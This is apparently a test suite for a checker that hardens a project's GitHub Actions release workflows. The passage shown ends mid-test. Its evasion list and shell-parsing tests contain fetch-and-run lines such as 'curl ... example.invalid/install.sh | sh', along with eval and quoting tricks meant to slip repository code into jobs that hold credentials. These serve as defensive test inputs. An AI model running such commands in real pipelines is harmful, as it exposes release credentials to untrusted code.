import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";

import { parse } from "yaml";

import {
	ALLOWED_ACTIONS,
	CREDENTIAL_JOBS,
	HEAD_OBJECT_GUARD,
	PRODUCTION_POINTERS,
	R2_WRITERS,
	REBUILD_ALLOWLIST,
	TEST_SIGNER_FLAG,
	TEST_SIGNER_STEP,
	artifactDirectoriesOf,
	checkWorkflows,
	credentialStepReasons,
	headObjectGuardReasons,
	ignoreScriptsEnabled,
	isCredentialBearing,
	lifecycleReasons,
	permissionEntries,
	r2StepReasons,
	referencesSecret,
	repositoryCodeReasons,
	shellCommands,
	splitWords,
} from "../check-release-workflow.mjs";

const RELEASE = ".github/workflows/build-binaries.yml";
const STANDALONE = ".github/workflows/standalone-binaries.yml";
const CI = ".github/workflows/ci.yml";

function reader(overrides = {}) {
	return (path) => overrides[path] ?? readFileSync(path, "utf8");
}

function mutate(path, mutateText) {
	const original = readFileSync(path, "utf8");
	const mutated = mutateText(original);
	assert.notEqual(mutated, original, "the mutation did not change the workflow; the anchor text moved");
	return mutated;
}

/** Appends a `run` step to the named job (which must already have at least one step). */
function appendStep(text, jobId, stepYaml) {
	const document = parse(text);
	const job = document.jobs[jobId];
	assert.ok(job, `job ${jobId} exists`);
	const lastStep = job.steps[job.steps.length - 1];
	const nextJob = Object.keys(document.jobs)[Object.keys(document.jobs).indexOf(jobId) + 1];
	const anchor = nextJob ? `\n  ${nextJob}:\n` : null;
	const insertAt = anchor ? text.indexOf(anchor) : text.length;
	assert.ok(insertAt > 0, `found the end of job ${jobId} (${lastStep.name})`);
	return `${text.slice(0, insertAt)}\n${stepYaml}${text.slice(insertAt)}`;
}

function runStep(name, script) {
	const body = script
		.split("\n")
		.map((line) => `          ${line}`)
		.join("\n");
	return `      - name: ${name}\n        run: |\n${body}\n`;
}

test("the checked-in workflows satisfy every invariant", () => {
	assert.deepEqual(checkWorkflows(), []);
});

test("every job that publishes holds its credential in a protected environment", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const jobId of CREDENTIAL_JOBS) {
		assert.ok(release.jobs[jobId], `${jobId} exists`);
		assert.ok(release.jobs[jobId].environment, `${jobId} runs in an environment`);
		assert.ok(isCredentialBearing(release.jobs[jobId]), `${jobId} is recognised as credential-bearing`);
	}
	// A contents:write GITHUB_TOKEN can push tags and publish releases: it is a credential.
	assert.ok(isCredentialBearing(release.jobs["github-release"]));
	assert.ok(isCredentialBearing(release.jobs["github-release-beta"]));
	// OIDC minting is a credential too.
	assert.ok(isCredentialBearing(release.jobs.sign));
	// Jobs that run repository code hold nothing.
	for (const jobId of ["build", "assemble", "validate-macos", "pack-npm", "context", "verify"]) {
		assert.equal(isCredentialBearing(release.jobs[jobId]), false, `${jobId} holds no credential`);
	}
});

test("GITHUB_TOKEN never masks another secret in the same job (finding A)", () => {
	// A job that reads R2_SECRET_ACCESS_KEY is credential-bearing no matter what else it references.
	const both = {
		permissions: { contents: "read" },
		steps: [
			{
				name: "Upload",
				env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}", AWS_SECRET_ACCESS_KEY: "${{ secrets.R2_SECRET_ACCESS_KEY }}" },
				run: "aws s3 cp x s3://y",
			},
		],
	};
	assert.equal(isCredentialBearing(both), true);
	// The same two references in ONE value.
	assert.equal(
		isCredentialBearing({ permissions: {}, env: { TOKENS: "${{ secrets.GITHUB_TOKEN }} ${{ secrets.R2_SECRET_ACCESS_KEY }}" }, steps: [] }),
		true,
	);
	// Only GITHUB_TOKEN, in any number of places, is not a credential.
	assert.equal(
		isCredentialBearing({
			permissions: { contents: "read" },
			env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}" },
			steps: [{ env: { GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}" }, run: "gh api x" }],
		}),
		false,
	);
	// Secrets reach a job through more than `env:`.
	for (const job of [
		{ permissions: {}, steps: [{ uses: "some/action@0000000000000000000000000000000000000000", with: { token: "${{ secrets.NPM_TOKEN }}" } }] },
		{ permissions: {}, steps: [{ run: 'echo "${{ secrets.R2_BUCKET }}"' }] },
		{ permissions: {}, steps: [{ run: "echo ${{ toJSON(secrets) }}" }] },
		{ permissions: {}, steps: [{ run: "echo ${{ secrets['R2_BUCKET'] }}" }] },
		{ permissions: {}, steps: [{ run: "echo ${{ secrets.GITHUB_TOKEN_BACKUP }}" }] },
		{ permissions: {}, if: "secrets.DEPLOY_KEY != ''", steps: [] },
		{ permissions: {}, steps: [{ if: "secrets.DEPLOY_KEY != ''", run: "true" }] },
	]) {
		assert.equal(isCredentialBearing(job), true, JSON.stringify(job));
	}
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN }}"), false);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN }} ${{ secrets.OTHER }}"), true);
	assert.equal(referencesSecret("${{ secrets.OTHER }} ${{ secrets.GITHUB_TOKEN }}"), true);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN2 }}"), true);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKENX }}"), true);
});

test("a job with both GITHUB_TOKEN and an R2 secret is classified credential-bearing and its checkout is flagged (finding A)", () => {
	// Take `build` - an unprivileged job that legitimately checks out - and give it an R2 secret next
	// to GITHUB_TOKEN in a step env. Before the fix GITHUB_TOKEN's presence exempted the whole value.
	const broken = mutate(RELEASE, (text) =>
		appendStep(
			text,
			"build",
			"      - name: Upload with both tokens\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}\n        run: aws s3 cp x s3://y\n",
		),
	);
	const release = parse(broken);
	assert.equal(isCredentialBearing(release.jobs.build), true);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(
		problems.some((problem) => problem.includes("'build'") && problem.includes("actions/checkout")),
		problems.join("\n"),
	);
	// The same secret pair as ONE job-level env value is rejected as a job-level secret too.
	const jobLevel = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n      TOKENS: ${{ secrets.GITHUB_TOKEN }} ${{ secrets.R2_ACCESS_KEY_ID }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	assert.ok(checkWorkflows(reader({ [RELEASE]: jobLevel })).some((problem) => problem.includes("exposes TOKENS")));
});

test("a tag trigger is rejected", () => {
	const broken = mutate(RELEASE, (text) => text.replace("  push:\n    branches:\n      - main\n", "  push:\n    branches:\n      - main\n    tags:\n      - 'v*'\n"));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("tag push")));
});

test("a wide workflow token is rejected", () => {
	const broken = mutate(RELEASE, (text) => text.replace("permissions: {}", "permissions:\n  contents: write"));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("permissions: {}")));
});

test("a job-level R2 secret is rejected", () => {
	const broken = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n      AWS_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("exposes AWS_ACCESS_KEY_ID")));
});

const CHECKOUT_STEP = "      - name: Sneak in a checkout\n        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0\n";
const SETUP_NODE_STEP = "      - name: Sneak in a toolchain\n        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0\n";

for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "publish-npm", "tap-bump", "github-release"]) {
	test(`actions/checkout inside credential-bearing job ${jobId} is rejected`, () => {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, CHECKOUT_STEP));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(
			problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("actions/checkout")),
			problems.join("\n"),
		);
	});
}

test("actions/setup-node is rejected in R2 jobs but allowed for npm trusted publishing", () => {
	const broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", SETUP_NODE_STEP));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release'") && problem.includes("setup-node")));
	const release = parse(readFileSync(RELEASE, "utf8"));
	assert.ok(release.jobs["publish-npm"].steps.some((step) => step.uses?.startsWith("actions/setup-node@")));
	assert.deepEqual(checkWorkflows(), []);
});

const EVASIONS = [
	["node scripts/x.mjs", "node scripts/pack-npm-packages.mjs --out-dir npm-packages"],
	["bash scripts/x.sh", "bash scripts/publish.sh"],
	["sh with a relative script", "sh ./publish.sh"],
	["./scripts/x.sh in command position", "./scripts/publish.sh --yes"],
	["python3 scripts/x.py", "python3 scripts/publish.py"],
	["source scripts/x", "source scripts/env.sh"],
	[". scripts/x", ". scripts/env.sh"],
	["a script under packages/", "node packages/coding-agent/scripts/publish.mjs"],
	["a script under .github/", "bash .github/scripts/publish.sh"],
	["$GITHUB_WORKSPACE/scripts", 'bash "$GITHUB_WORKSPACE/scripts/publish.sh"'],
	["${GITHUB_WORKSPACE}/packages", 'node "${GITHUB_WORKSPACE}/packages/coding-agent/dist/cli.js"'],
	["an interpreter after a pipe", 'echo hi | node scripts/publish.mjs'],
	["an interpreter after &&", 'test -f x && node scripts/publish.mjs'],
	["a continued line", 'node \\\n  scripts/publish.mjs'],
	["a variable assignment prefix", 'FOO=bar node scripts/publish.mjs'],
	["npm ci", "npm ci --ignore-scripts"],
	["npm install", "npm install"],
	["npm rebuild", "npm rebuild esbuild"],
	["npm run", "npm run build"],
	["npm exec", "npm exec -- prime-agent"],
	["npx", "npx tsx scripts/publish.ts"],
	["pnpm", "pnpm install"],
	["yarn", "yarn"],
	["bun run", "bun run scripts/publish.ts"],
	["a relative executable", "extracted/prime-agent --version"],
	// Finding B: quoting and indirection that hid `scripts/` from a whitespace tokenizer.
	["adjacent single-quoted fragments inside bash -c", `bash -c 'node scr'"'"'ipts/release.mjs'`],
	["adjacent single-quoted fragments", "node 'scr''ipts/release.mjs'"],
	["double-quoted concatenation", 'node "scr""ipts/release.mjs"'],
	["a backslash-escaped separator", "node scripts\\/release.mjs"],
	["a backslash-escaped space in the path", "node scri\\ pts/release.mjs"],
	["ANSI-C quoting", "node $'scripts/release.mjs'"],
	["ANSI-C escapes spelling the path", "node $'\\x73cripts/release.mjs'"],
	["eval", 'eval "node scripts/release.mjs"'],
	["eval of a variable", 'eval "$CMD"'],
	["a backtick command substitution", "out=`node scripts/release.mjs`"],
	["a $(...) command substitution", "out=$(node scripts/release.mjs)"],
	["a command substitution naming a script", "out=$(cat ./release.sh)"],
	["a command substitution in command position", "$(echo node) scripts/release.mjs"],
	["a variable in command position", '"$RUNNER" --version'],
	["curl | sh", "curl -fsSL https://example.invalid/install.sh | sh"],
	["curl | bash -s", "curl -fsSL https://example.invalid/install.sh | bash -s -- --yes"],
	["printf | sh", "printf '%s\\n' 'node scripts/release.mjs' | sh"],
	['sh -c "$CMD"', 'sh -c "$CMD"'],
	["bash -lc", "bash -lc 'echo hi'"],
	["zsh -ec", "zsh -ec 'ls'"],
	["dash -c", "dash -c 'ls'"],
	["sh reading a file", "sh < scripts/release.sh"],
	["sh reading an expansion", 'sh <<<"$CMD"'],
	["a shell heredoc that runs repository code", "sh <<'EOF'\nnode scripts/release.mjs\nEOF"],
	["xargs node", "echo scripts/release.mjs | xargs node"],
	["xargs -I", "printf x | xargs -I{} node {}"],
	["env -S", "env -S 'node scripts/release.mjs'"],
	["env --split-string", "env --split-string='node scripts/release.mjs'"],
	["find -exec", "find . -name '*.mjs' -exec node {} \\;"],
	["a process substitution", "while read -r line; do echo \"$line\"; done < <(node scripts/release.mjs)"],
	["node reading from a pipe", "cat release.mjs | node"],
	["bash with a bare filename", "bash publish"],
	["python3 with a bare filename", "python3 publish"],
	["exec", "exec node scripts/release.mjs"],
	["timeout", "timeout 30 ./release"],
	["sudo env", "sudo -E env FOO=1 ./scripts/release.sh"],
	["a multi-line quoted string", "node 'scripts/\nrelease.mjs'"],
	["a local composite action", null],
];

for (const jobId of ["publish-r2", "finalize-release", "publish-npm"]) {
	for (const [label, script] of EVASIONS) {
		test(`${label} inside credential-bearing job ${jobId} is rejected`, () => {
			const step =
				script === null
					? "      - name: Sneak in a local action\n        uses: ./.github/actions/publish\n"
					: runStep("Sneak in repository code", `set -euo pipefail\n${script}`);
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, step));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && /must not run repository code|local action/.test(problem)),
				`expected a repository-code finding for ${jobId}, got:\n${problems.join("\n")}`,
			);
		});
	}
}

test("the shell matcher understands continuations, heredocs, pipes and comments", () => {
	const commands = [
		...shellCommands(
			"digest=$(grep -E 'x' \\\n  \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1)\npython3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY\n# node scripts/comment.mjs\necho ok # node scripts/comment.mjs\n",
		),
	];
	// Round 4, finding 6: the heredoc body is re-parsed and yielded too, whatever program reads it.
	assert.deepEqual(
		commands.map((command) => command.words.map((word) => word.text)),
		[["digest=$(grep -E 'x'    \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1)"], ["python3", "-", "$formula"], ["import", "scripts/evil"], ["echo", "ok"]],
	);
	assert.deepEqual(commands[0].substitutions, ["grep -E 'x'    \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1"]);
	assert.deepEqual(repositoryCodeReasons(commands[0]), []);
	assert.match(repositoryCodeReasons(commands[1]).join("\n"), /python3 reads its script from a heredoc/);
	assert.match(repositoryCodeReasons(commands[1]).join("\n"), /python3 reads its script from stdin/);
	assert.match(repositoryCodeReasons(commands[2]).join("\n"), /references the checkout: scripts\/evil/);
	assert.deepEqual(repositoryCodeReasons(commands[3]), []);
});

test("word splitting resolves adjacent quoted fragments the way a POSIX shell does (finding B)", () => {
	const words = (line) => splitWords(line).commands.map((command) => command.words.map((word) => word.text));
	assert.deepEqual(words(`bash -c 'node scr'"'"'ipts/release.mjs'`), [["bash", "-c", "node scr'ipts/release.mjs"]]);
	assert.deepEqual(words(`node 'scr''ipts/x.mjs'`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node "scr""ipts/x.mjs"`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node scr\\ipts/x.mjs`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node scri\\ pts/x.mjs`), [["node", "scri pts/x.mjs"]]);
	assert.deepEqual(words(`node $'scripts/x.mjs'`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node $'\\x73cripts/\\146.mjs'`), [["node", "scripts/f.mjs"]]);
	assert.deepEqual(words(`echo "a \\"b\\" \\$c" 'd $e' f\\ g`), [["echo", 'a "b" $c', "d $e", "f g"]]);
	// Separators, comments and redirections.
	assert.deepEqual(words("a; b && c || d | e & f"), [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]);
	assert.deepEqual(words("a # b c"), [["a"]]);
	assert.deepEqual(words("a '#' b"), [["a", "#", "b"]]);
	assert.deepEqual(words('a > out 2>&1 <<<"x" >>log'), [["a"]]);
	assert.deepEqual(words("names+=(\"$name\") x"), [['names+=("$name")', "x"]]);
	assert.deepEqual(words("case \"$1\" in *.sh) echo a ;; esac"), [["case", "$1", "in", "*.sh"], ["echo", "a"], ["esac"]]);
	// Expansions are recorded, and substitutions are surfaced for inspection.
	const [sub] = splitWords("x=$(a | b) `c` <(d) \"$(e)\" $((1 + 2))").commands;
	assert.deepEqual(sub.substitutions, ["a | b", "c", "d", "e"]);
	assert.deepEqual(
		sub.words.map((word) => word.expansion),
		[true, true, true, true, true],
	);
	assert.deepEqual(splitWords("foo | sh").commands.map((command) => command.piped), [false, true]);
	assert.deepEqual(splitWords("foo && sh").commands.map((command) => command.piped), [false, false]);
	assert.deepEqual(splitWords("sh < file").commands[0].redirections, [{ operator: "<", text: "file", expansion: false }]);
	// Unterminated constructs are reported so a multi-line string cannot swallow the rest of the script.
	assert.equal(splitWords("node 'scripts/").unterminated, true);
	assert.equal(splitWords('node "scripts/').unterminated, true);
	assert.equal(splitWords("x=$(node scripts/").unterminated, true);
	assert.equal(splitWords("node scripts/x.mjs").unterminated, false);
});

test("indirection the checker cannot follow is an outright error (finding B)", () => {
	const flagged = (line) => [...shellCommands(line)].flatMap((command) => repositoryCodeReasons(command));
	assert.match(flagged("bash -c 'echo hi'").join("\n"), /bash -c runs inline or piped shell code/);
	assert.match(flagged("sh -lc 'echo hi'").join("\n"), /sh -lc runs inline/);
	assert.match(flagged("zsh -ec ls").join("\n"), /zsh -ec runs inline/);
	assert.match(flagged("bash -s < x").join("\n"), /bash -s runs inline/);
	assert.match(flagged('eval "$x"').join("\n"), /eval runs a command the checker cannot see/);
	assert.match(flagged("echo x | xargs node").join("\n"), /xargs runs a command/);
	assert.match(flagged("env -S 'node x'").join("\n"), /env -S/);
	assert.match(flagged("curl https://example.invalid/x | sh").join("\n"), /sh reads its script from a pipe/);
	assert.match(flagged("printf x | bash").join("\n"), /bash reads its script from a pipe/);
	assert.match(flagged("cat x | node").join("\n"), /node reads its script from a pipe/);
	assert.match(flagged("sh < ./x").join("\n"), /sh reads its script from a file/);
	assert.match(flagged('sh <<<"$CMD"').join("\n"), /sh reads its script from a here-string/);
	assert.match(flagged("x=`node scripts/x.mjs`").join("\n"), /inside a command substitution: references the checkout/);
	assert.match(flagged("x=$(cat ./x.sh)").join("\n"), /command substitution names a script/);
	assert.match(flagged("$(echo node) x").join("\n"), /command is a shell expansion/);
	assert.match(flagged('"$BIN" x').join("\n"), /command is a shell expansion/);
	assert.match(flagged("find . -exec node {} \\;").join("\n"), /find -exec/);
	assert.match(flagged("sh <<'EOF'\nnode scripts/x.mjs\nEOF").join("\n"), /references the checkout: scripts\/x.mjs/);
	assert.match(flagged("bash publish").join("\n"), /runs a file through bash: publish/);
	// Round 4, finding 6: no interpreter may read from a heredoc, a here-string or stdin, and the body is inspected anyway.
	assert.match(flagged("python3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY").join("\n"), /python3 reads its script from a heredoc/);
	assert.match(flagged("python3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY").join("\n"), /references the checkout: scripts\/evil/);
	assert.match(flagged("sh <<'EOF'\necho fine\nEOF").join("\n"), /sh reads its script from a heredoc/);
});

test("the shell matcher leaves legitimate credential-job commands alone", () => {
	const fine = [
		"aws s3 cp artifacts/latest.json s3://bucket/latest.json --quiet",
		"gh release edit v1.2.3 --draft=false --latest",
		'cosign verify-blob --certificate-identity "https://github.com/o/r/.github/workflows/build-binaries.yml@refs/heads/main" SHA256SUMS',
		"npm publish npm-packages/artifacts/x.tgz --provenance --access public --ignore-scripts",
		"jq -r '.publishOrder[]' npm-packages/manifest.json",
		"node -e 'console.log(1)'",
		"python3 -c 'print(1)'",
		"node --version",
		"sed -E \"s/x/${digest}/\" \"$formula\" > \"$formula.tmp\"",
		"[[ \"$PRODUCTION_VERSION\" =~ $version_pattern ]] || { echo bad >&2; exit 1; }",
		"sha256sum --check SHA256SUMS",
		"command -v uv",
		"count=$((count + 1))",
		"names=()",
		'while IFS= read -r name; do names+=("$name"); done < <(jq -r \'.publishOrder[]\' npm-packages/manifest.json)',
		'test "$(jq -r .isDraft /tmp/release.json)" = true',
		'echo "Draft ${TAG} targets ${BUILD_REF}; $(jq length /tmp/current-assets.json) assets unchanged."',
		'if [[ "$BUILD_REF" =~ ^[0-9a-f]{40}$ ]]; then echo ok; fi',
		'case "$name" in *.tar.gz) echo archive ;; esac',
		'local_digest="sha256:$(sha256sum "artifacts/$name" | cut -d\' \' -f1)"',
		"printf 'Automated beta build from `%s` (`%s`).\\n' \"$DEFAULT_BRANCH\" \"$BUILD_REF\" > /tmp/beta-release-notes.md",
		"gh release create \"$TAG\" --draft --notes-file /tmp/notes.md artifacts/*",
		"test -f artifacts/install.sh",
		"grep -E 'x' \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\"",
		"/usr/bin/env true",
	];
	for (const line of fine) {
		for (const tokens of shellCommands(line)) assert.deepEqual(repositoryCodeReasons(tokens), [], line);
	}
});

test("the pointers may only move in finalize-release, after the release is published", () => {
	// publish-r2 moving stable is exactly the ordering bug this file exists to prevent.
	const broken = mutate(RELEASE, (text) =>
		appendStep(text, "publish-r2", runStep("Advance early", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" --quiet')),
	);
	let problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("only 'finalize-release' may write a production pointer")));

	const beta = mutate(RELEASE, (text) =>
		text.replace(
			'          aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" \\',
			'          aws s3 cp artifacts/install.sh "s3://${R2_BUCKET}/install.sh"\n          aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" \\',
		),
	);
	problems = checkWorkflows(reader({ [RELEASE]: beta }));
	assert.ok(problems.some((problem) => problem.includes("beta channel must never write a production pointer")));

	// A step after the pointer step in finalize-release is rejected: pointers move last.
	const late = mutate(RELEASE, (text) => appendStep(text, "finalize-release", runStep("Afterthought", "echo done")));
	problems = checkWorkflows(reader({ [RELEASE]: late }));
	assert.ok(problems.some((problem) => problem.includes("in its last step")));

	// Moving the pointers before the release is undrafted is rejected.
	const early = mutate(RELEASE, (text) =>
		text.replace(
			"      - name: Publish the release and prove the tag points at BUILD_REF\n",
			`${runStep("Advance first", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" --quiet')}\n      - name: Publish the release and prove the tag points at BUILD_REF\n`,
		),
	);
	problems = checkWorkflows(reader({ [RELEASE]: early }));
	assert.ok(problems.some((problem) => problem.includes("must publish the GitHub release before it moves the channel pointers")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release' must advance the channel pointers in its last step")), problems.join("\n"));

	// Dropping one pointer from the last step is rejected: all four move together.
	const partial = mutate(RELEASE, (text) => text.replace('          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n', '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/stable" \\\n'));
	problems = checkWorkflows(reader({ [RELEASE]: partial }));
	assert.ok(problems.some((problem) => problem.includes("missing: stable")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("outside the allowlist for 'finalize-release'")), problems.join("\n"));
});

test("the publication order is enforced: github-release -> publish-r2 -> verify -> finalize-release -> npm/tap", () => {
	for (const [later, earlier, replacement] of [
		["verify", "publish-r2", "needs: [context, github-release]"],
		["finalize-release", "verify", "needs: [context, publish-r2]"],
		["publish-npm", "finalize-release", "needs: [context, pack-npm]"],
		["tap-bump", "finalize-release", "needs: [context, verify]"],
	]) {
		const release = parse(readFileSync(RELEASE, "utf8"));
		const current = `needs: [${release.jobs[later].needs.join(", ")}]`;
		const broken = mutate(RELEASE, (text) => {
			const start = text.indexOf(`\n  ${later}:\n`);
			const index = text.indexOf(current, start);
			assert.ok(index > start, `${later} declares ${current}`);
			return `${text.slice(0, index)}${replacement}${text.slice(index + current.length)}`;
		});
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(
			problems.some((problem) => problem.includes(`'${later}' must need '${earlier}'`)),
			`${later} without ${earlier}:\n${problems.join("\n")}`,
		);
	}
});

test("a credential job outside a protected environment is rejected", () => {
	const broken = mutate(RELEASE, (text) =>
		text.replace(
			"    environment:\n      name: release-npm\n",
			"",
		),
	);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'publish-npm' must run in a protected environment")));
});

test("npm ci without --ignore-scripts is rejected", () => {
	const broken = mutate(STANDALONE, (text) => text.replace("npm ci --ignore-scripts", "npm ci"));
	const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("--ignore-scripts")));
});

test("an unpinned action is rejected", () => {
	const broken = mutate(STANDALONE, (text) =>
		text.replace("oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2", "oven-sh/setup-bun@v2"),
	);
	const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("without a full commit SHA")));
});

test("the test signer override may be compiled in exactly one standalone step and never uploaded (finding C)", () => {
	const RELEASE_TRUST = "packages/coding-agent/src/utils/release-trust.ts";
	assert.equal(TEST_SIGNER_STEP.workflow, STANDALONE);
	const standalone = parse(readFileSync(STANDALONE, "utf8"));
	const compile = standalone.jobs[TEST_SIGNER_STEP.job].steps.find((step) => step.name === TEST_SIGNER_STEP.step);
	assert.ok(compile.run.includes(TEST_SIGNER_FLAG), "the designated step compiles with the flag");

	// The flag anywhere else - the release compile, another job, an env value - is rejected.
	let broken = mutate(STANDALONE, (text) => text.replace("run: npm run build:binary", `run: npm run build:binary -- ${TEST_SIGNER_FLAG} signer.json`));
	let problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG) && problem.includes("'Compile standalone application'")), problems.join("\n"));
	broken = mutate(RELEASE, (text) => appendStep(text, "build", runStep("Sneak a test signer in", `node packages/coding-agent/scripts/build-binary.mjs ${TEST_SIGNER_FLAG} x.json`)));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG) && problem.includes("'build'")), problems.join("\n"));
	// So is defining the identifier by hand.
	broken = mutate(RELEASE, (text) => appendStep(text, "build", runStep("Define it directly", "bun build --define __PRIME_AGENT_RELEASE_SIGNER_OVERRIDE__='\"{}\"' x")));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("__PRIME_AGENT_RELEASE_SIGNER_OVERRIDE__")), problems.join("\n"));
	// Renaming the designated step turns its own flag into a violation.
	broken = mutate(STANDALONE, (text) => text.replace(`name: ${TEST_SIGNER_STEP.step}`, "name: Compile another binary"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG)), problems.join("\n"));

	// The uploaded artifact must not reach into the test-signer directories or a whole tree.
	for (const extra of ["${{ runner.temp }}/test-release/current/*.tar.gz", "${{ runner.temp }}/**", "${{ runner.temp }}/", "source/packages/coding-agent/binaries-test-signer/"]) {
		broken = mutate(STANDALONE, (text) => text.replace("            ${{ runner.temp }}/standalone/binaries.json\n", `            \${{ runner.temp }}/standalone/binaries.json\n            ${extra}\n`));
		problems = checkWorkflows(reader({ [STANDALONE]: broken }));
		assert.ok(problems.some((problem) => /test-signer|directory tree/.test(problem)), `${extra}:\n${problems.join("\n")}`);
	}
	// The test build must stay under $RUNNER_TEMP/test-release.
	broken = mutate(STANDALONE, (text) => text.replace(`"$RUNNER_TEMP/test-release/next" 99.0.0`, `"$RUNNER_TEMP/standalone" 99.0.0`));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("under $RUNNER_TEMP/test-release")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace(`${TEST_SIGNER_FLAG} "$RUNNER_TEMP/test-release/signer.json"`, `${TEST_SIGNER_FLAG} signer.json`));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("signer JSON from under $RUNNER_TEMP/test-release")), problems.join("\n"));
	// ...and be compiled only after the release archive has been assembled.
	broken = mutate(STANDALONE, (text) => {
		const start = text.indexOf("      - name: Assemble native archive\n");
		const end = text.indexOf("      - name: Resolve the signer identity of this job\n");
		const assemble = text.slice(start, end);
		const anchor = "      - name: Remove the build paths from the test machine\n";
		return `${text.slice(0, start)}${text.slice(end).replace(anchor, `${assemble}${anchor}`)}`;
	});
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("must be assembled before")), problems.join("\n"));

	// The standalone job may hold id-token:write ONLY because the updater pins a different workflow path.
	const trust = readFileSync(RELEASE_TRUST, "utf8");
	broken = trust.replace('RELEASE_SIGNER_WORKFLOW_PATH = ".github/workflows/build-binaries.yml"', 'RELEASE_SIGNER_WORKFLOW_PATH = ".github/workflows/standalone-binaries.yml"');
	assert.notEqual(broken, trust);
	problems = checkWorkflows(reader({ [RELEASE_TRUST]: broken }));
	assert.ok(problems.some((problem) => problem.includes("RELEASE_SIGNER_WORKFLOW_PATH must pin")), problems.join("\n"));
	// ...and nothing else may be granted next to repository code, in the called or the calling job.
	broken = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "      contents: write\n      id-token: write\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("holds 'contents: write'")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "      contents: read\n      id-token: write\n      attestations: write\n"));
